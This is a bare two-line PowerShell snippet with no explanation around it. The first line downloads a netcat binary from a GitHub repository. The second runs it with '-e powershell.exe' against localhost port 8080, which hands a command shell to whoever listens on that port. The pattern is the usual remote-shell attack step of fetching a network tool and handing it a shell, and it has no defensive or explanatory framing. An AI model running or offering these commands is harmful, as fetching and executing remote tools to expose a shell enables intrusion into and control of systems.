invoke-webrequest -uri 'https://github.com/SmashTester/Tester/raw/master/nc.exe' -outfile 'nc.exe';
.\nc.exe localhost 8080 -e powershell.exe
